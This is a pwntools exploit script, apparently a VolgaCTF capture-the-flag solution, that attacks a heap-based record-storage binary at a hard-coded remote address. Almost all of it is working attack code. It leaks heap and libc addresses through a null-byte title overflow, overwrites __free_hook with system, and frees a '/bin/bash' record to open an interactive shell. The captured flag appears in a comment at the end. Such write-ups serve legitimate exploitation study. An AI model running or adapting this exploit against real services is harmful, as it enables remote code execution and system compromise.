#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 139.162.160.184 --port 19999 bin
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('bin')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '139.162.160.184'
port = int(args.PORT or 19999)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

'''
record structure
0 nextptr
8 title string
16 content ptr

storeRecord has null byte overflow with title
modify title byte overflow
modify title no string terminator
'''
io = start(env={'LD_PRELOAD': './libc.so.6'})
libc = ELF('./libc.so.6')

def store_record(title, content):
    io.sendlineafter('[S]', 'S')
    io.sendlineafter('Type title', title)
    io.sendlineafter('content', content)

def delete_record(title):
    io.sendlineafter('[S]', 'D')
    io.sendlineafter('Type title', title)

def return_record(title):
    io.sendlineafter('[S]', 'R')
    io.sendlineafter('Type title\n', title)

def modify_title(title, new_title):
    io.sendlineafter('[S]', 'M')
    io.sendlineafter('Type title', title)
    io.sendlineafter('new title', new_title)

def modify_content(title, new_content):
    io.sendlineafter('[S]', 'U')
    io.sendlineafter('Type title', title)
    io.sendlineafter('content', new_content)

def print_all():
    io.sendlineafter('[S]', 'P')

# small string record
store_record('short', 'lol')

# prep for libc leak
# I want 8 chunks with 0x100 malloc content (long strings)
for x in range(8):
    store_record(str(x), 'lolaaaaaaaaaaaaaaaa')

# then one 'end' chunk to block 
# the others from being merged with top chunk
store_record('end', 'bruh')

# heap leak
# modify title, removing the null terminator
# we have to use one of the malloc strings chunks
# Also we use 'print all' because we need to print the title,
# Return record won't do
modify_title('0', 'b'*9)
print_all()
io.recvuntil('b'*9)
heap_base = u64(b'\x00' + io.recv(5) + b'\x00\x00') & 0xFFFFFFFFFFFFF000
log.info(f'Heap Base: {hex(heap_base)}')

# Put the title and the 'short string' byte back to normal
# We need to do this or we won't be able to fill the 0x110 bin
modify_title('b'*8, '0' + '\x00'*7 + '\xa0')

# Fill the 0x110 tcache bin and put one on the unsorted bin
# The unsorted bin chunk will have pointers to libc main arena
for x in range(8):
    delete_record(str(x))

# Recover the libc leak
libc_leak_addr = heap_base + 0xaf0 # found with gdb

# Use shortstring to place 7 bytes of the address
new_content = p64(libc_leak_addr)[1:]
modify_content('short', new_content)

# Use the overflow on the title to set the
# least important byte of the nextptr, removing the shortstring flag
# and placing the remaining byte of the address to leak
new_title = 'short' + '\x00'*3 + chr(libc_leak_addr & 0xFF)
modify_title('short', new_title)

# Now 'short' is actually a malloc record, and its content will
# give us libc leak. Let's recover it.
return_record('short')
libc.address = u64(io.recv(6) + b'\x00\x00') - \
    (0x7fe47906bca0 - 0x7fe478c80000) # found with gdb
log.info(f'Libc Base: {hex(libc.address)}')

# make 'short' a short string record again
new_title = 'short' + '\x00'*3 + '\x01'
modify_title('short', new_title)

# set up a chunk to store the shell command
store_record('shell', '/bin/bash\x00' + 'a'*10)

# modify free hook, using pretty much
# the same technique we used to leak libc
# Except instead of reading the content,
# we write to it. the content will be free_hook
free_hook = libc.sym['__free_hook']
system = libc.sym['system']
new_content = p64(free_hook)[1:]
new_title = 'short' + '\x00'*3 + chr(free_hook & 0xFF)
modify_content('short', new_content)
modify_title('short', new_title)
modify_content('short', p64(system))

# Call shell command
delete_record('shell')
io.interactive() # VolgaCTF{N1cke1_unD_d!mE_a_b!t}
